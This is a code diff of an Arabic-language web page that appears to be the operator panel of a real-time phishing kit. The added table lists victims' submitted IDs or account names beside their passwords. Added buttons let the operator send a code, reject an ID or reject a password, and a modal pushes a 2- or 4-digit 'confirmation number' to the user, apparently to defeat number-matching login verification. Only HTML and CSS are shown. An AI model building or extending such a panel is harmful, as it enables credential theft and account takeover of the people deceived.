@@ -3,45 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - استعراض البيانات الشاملة</title>
+    <title>لوحة التحكم - إجراءات الإدارة</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         body { font-family: 'Cairo', sans-serif; background-color: #f4f7f6; margin: 0; padding: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; }
+        .container { max-width: 1300px; margin: 0 auto; }
         h2 { color: #14805e; border-bottom: 2px solid #14805e; padding-bottom: 10px; }
         .table-container { background: #fff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); overflow-x: auto; margin-top: 20px; }
         table { width: 100%; border-collapse: collapse; text-align: right; }
-        th, td { padding: 15px; border-bottom: 1px solid #eee; }
+        th, td { padding: 12px 15px; border-bottom: 1px solid #eee; vertical-align: middle; }
         th { background-color: #14805e; color: white; font-weight: 600; }
         tr:hover { background-color: #f9f9f9; }
-        .status-badge { padding: 5px 10px; border-radius: 20px; font-size: 13px; font-weight: 600; text-align: center; display: inline-block; }
+        
+        /* أزرار الإجراءات */
+        .btn-action { padding: 6px 12px; border: none; border-radius: 4px; font-family: 'Cairo'; font-size: 12px; font-weight: 600; cursor: pointer; margin-left: 5px; color: white; transition: background 0.2s; }
+        .btn-code { background-color: #0284c7; } .btn-code:hover { background-color: #0369a1; }
+        .btn-wrong-id { background-color: #ea580c; } .btn-wrong-id:hover { background-color: #c2410c; }
+        .btn-wrong-pass { background-color: #dc2626; } .btn-wrong-pass:hover { background-color: #b91c1c; }
+        
+        .status-badge { padding: 4px 8px; border-radius: 20px; font-size: 12px; font-weight: 600; }
         .waiting { background-color: #fef3c7; color: #d97706; }
-        .approved { background-color: #d1fae5; color: #065f46; }
-        .type-badge { padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
+        .action-done { background-color: #e2e8f0; color: #475569; }
+        .type-badge { padding: 3px 6px; border-radius: 4px; font-size: 11px; font-weight: bold; }
         .type-app { background-color: #e0f2fe; color: #0369a1; }
         .type-pass { background-color: #f3e8ff; color: #6b21a8; }
+
+        /* النافذة المنبثقة لإدخال الرقم */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; z-index: 10000; }
+        .modal-content { background: white; padding: 25px; border-radius: 8px; width: 320px; text-align: center; font-family: 'Cairo'; }
+        .modal-content input { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; text-align: center; font-size: 18px; font-weight: bold; }
+        .modal-btns { display: flex; justify-content: space-around; }
+        .btn-confirm { background: #14805e; color: white; padding: 8px 20px; border: none; border-radius: 4px; cursor: pointer; }
+        .btn-cancel { background: #718096; color: white; padding: 8px 20px; border: none; border-radius: 4px; cursor: pointer; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h2><i class="fa-solid fa-users-gear"></i> مراقبة الطلبات الرقمية (لحظياً)</h2>
+        <h2><i class="fa-solid fa-users-gear"></i> لوحة تحكم الإجراءات الفورية</h2>
         
         <div class="table-container">
             <table>
                 <thead>
                     <tr>
                         <th>نوع الطلب</th>
-                        <th>البيانات المستلمة (الهوية / الحساب)</th>
+                        <th>البيانات المستلمة</th>
                         <th>كلمة المرور</th>
-                        <th>التاريخ والوقت</th>
-                        <th>الحالة المعالجة</th>
+                        <th>الحالة</th>
+                        <th>الإجراءات المتخذة</th>
                     </tr>
                 </thead>
                 <tbody id="logsTableBody">
                     </tbody>
             </table>
+        </div>
+    </div>
+
+    <div id="codeModal" class="modal">
+        <div class="modal-content">
+            <h3>إرسال رقم التأكيد</h3>
+            <p>أدخل الرقم المكون من 2 أو 4 أرقام ليظهر للمستخدم:</p>
+            <input type="number" id="confirmationCodeInput" placeholder="مثال: 45" required>
+            <div class="modal-btns">
+                <button class="btn-confirm" id="submitCodeBtn">إرسال الآن</button>
+                <button class="btn-cancel" id="closeModalBtn">إلغاء</button>
+            </div>
         </div>
     </div>
 
